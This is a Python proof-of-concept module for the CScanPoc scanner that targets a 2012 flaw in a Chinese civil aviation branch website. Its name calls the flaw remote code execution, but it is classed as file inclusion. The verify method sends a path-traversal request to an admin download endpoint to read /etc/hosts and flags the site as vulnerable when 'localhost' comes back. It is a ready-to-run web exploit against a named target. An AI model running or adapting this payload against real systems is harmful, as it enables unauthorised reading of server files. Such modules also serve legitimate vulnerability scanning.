# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Safety_0101' # 平台漏洞编号
    name = '中国民航分站远程代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2012-06-12'  # 漏洞公布时间
    desc = '''模版漏洞描述
    中国民航分站远程代码执行漏洞, 攻击者可以通过本地文件包含来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=8133
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = ''  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2c18f7cc-b49a-43f6-a1ad-b1fb1a581b70' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-12' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/admin/upload/common_downloadFile.do?localfilename=%D0%CD%BA%C5%C8%CF%BF%C9%D6%A4(VTC).pdf&destfilename=../../../../../../../../etc/hosts"
            url = self.target + payload
            respone = requests.get(url)
            if "localhost" in respone.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
